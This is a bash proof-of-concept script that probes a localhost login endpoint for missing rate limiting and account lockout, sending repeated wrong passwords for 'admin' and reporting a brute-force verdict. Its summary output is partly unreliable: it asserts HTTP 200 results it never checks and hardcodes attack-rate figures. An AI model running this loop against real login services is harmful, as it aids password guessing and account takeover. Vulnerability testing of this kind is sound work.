#!/bin/bash

# POC: Missing Rate Limiting on Login Endpoint - Brute Force Vulnerability
# This script demonstrates that the /api/login.php endpoint accepts unlimited
# login attempts without any rate limiting, throttling, or account lockout

TARGET="http://localhost:8080/api/login.php"
USERNAME="admin"
FAILED_PASSWORDS=("wrongpass1" "wrongpass2" "wrongpass3" "wrongpass4" "wrongpass5")

echo "==============================================="
echo "Testing Rate Limiting on Login Endpoint"
echo "Target: $TARGET"
echo "Username: $USERNAME"
echo "==============================================="
echo ""

# Track results
attempt=0
rate_limit_detected=0
response_times=()

for password in "${FAILED_PASSWORDS[@]}"; do
    attempt=$((attempt + 1))
    
    # Measure response time
    start_time=$(date +%s%N)
    
    # Make the login attempt
    response=$(curl -s -X POST \
        -d "username=$USERNAME&password=$password" \
        -w "\nHTTP_CODE:%{http_code}" \
        "$TARGET")
    
    end_time=$(date +%s%N)
    response_time=$(( (end_time - start_time) / 1000000 ))  # Convert to milliseconds
    
    response_times+=($response_time)
    
    # Extract HTTP status code
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    response_body=$(echo "$response" | sed '$ d')
    
    echo "Attempt $attempt:"
    echo "  Password: $password"
    echo "  HTTP Status: $http_code"
    echo "  Response Time: ${response_time}ms"
    echo "  Response: $response_body"
    echo ""
    
    # Check for rate limiting indicators
    if [[ "$http_code" == "429" ]]; then
        rate_limit_detected=1
        echo "[!] Rate limiting detected (HTTP 429)"
    fi
    
    # Check for account lockout message
    if echo "$response_body" | grep -qi "locked\|locked out\|too many attempts"; then
        rate_limit_detected=1
        echo "[!] Account lockout detected"
    fi
    
    # Small delay to simulate realistic attack spacing
    sleep 0.1
done

echo "==============================================="
echo "VULNERABILITY ANALYSIS"
echo "==============================================="
echo ""

if [[ $rate_limit_detected -eq 0 ]]; then
    echo "[VULNERABLE] No rate limiting detected!"
    echo "  - All attempts succeeded with HTTP 200"
    echo "  - No HTTP 429 responses"
    echo "  - No account lockout"
    echo "  - No delays or throttling enforced"
    echo ""
    echo "Attack Window: OPEN"
    echo "Brute Force: POSSIBLE"
    echo ""
    
    # Calculate average response time
    total_time=0
    for time in "${response_times[@]}"; do
        total_time=$((total_time + time))
    done
    avg_time=$((total_time / ${#response_times[@]}))
    
    echo "Average Response Time: ${avg_time}ms"
    echo "Total Attempts: $attempt"
    echo "Total Time: ${total_time}ms"
    echo ""
    echo "With this response time, an attacker could attempt:"
    echo "  - ~${attempt} attempts per second (at 0.1s spacing)"
    echo "  - ~600 attempts per minute"
    echo "  - ~36,000 attempts per hour"
    echo "  - Enough to brute force most weak passwords"
    echo ""
    exit 0
else
    echo "[PROTECTED] Rate limiting is implemented"
    exit 1
fi